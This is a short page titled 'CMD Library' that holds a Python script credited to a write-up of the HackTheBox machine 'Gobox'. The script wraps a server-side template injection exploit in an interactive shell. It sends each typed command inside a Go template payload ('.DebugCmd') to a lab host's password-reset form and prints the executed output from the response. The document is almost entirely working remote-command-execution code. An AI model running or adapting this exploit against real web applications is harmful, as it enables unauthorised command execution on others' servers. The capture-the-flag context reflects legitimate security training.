# CMD Library
```python
#!/usr/bin/env python3    

import re    
import requests    
from cmd import Cmd    
from html import unescape    


class Term(Cmd):    
    prompt = "gobox> "    
    capture_re = re.compile(r"Email Sent To: (.*?)\s+<button class", re.DOTALL)    

    def default(self, args):    
        """Run given input as command on gobox"""    
        cmd = args.replace('"', '\\"')    
        resp = requests.post('http://10.10.11.113:8080/forgot/',    
                data = {"email": f'{{{{ .DebugCmd "{cmd}" }}}}'},    
                proxies = {"http": "http://127.0.0.1:8080"})    
        try:    
            result = self.capture_re.search(resp.text).group(1)    
            result = unescape(unescape(result))
            print(result)
        except:
            import pdb; pdb.set_trace()


    def do_exit(self, args):
        """Exit"""
        return True


term = Term()
term.cmdloop()
```

Credits: [HTB: Gobox | 0xdf hacks stuff](https://0xdf.gitlab.io/2021/08/30/htb-gobox.html)